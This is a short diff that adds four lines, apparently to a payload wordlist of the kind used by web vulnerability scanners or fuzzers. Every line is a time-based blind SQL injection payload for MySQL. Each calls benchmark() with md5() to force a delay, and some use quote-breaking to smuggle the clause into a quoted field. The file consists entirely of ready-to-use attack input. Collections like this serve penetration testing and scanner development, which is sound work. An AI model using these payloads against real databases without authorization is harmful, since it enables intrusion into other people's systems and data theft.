@@ -1,0 +1,4 @@
+(select benchmark(15000000,md5(0x4e446b6e))-9999) as test
+benchmark(15000000,md5(0x4e446b6e))-9999
+9999' or benchmark(15000000,md5(0x4e446b6e)) or '0'='9999
+9999" or benchmark(15000000,md5(0x4e446b6e)) or "0"="9999
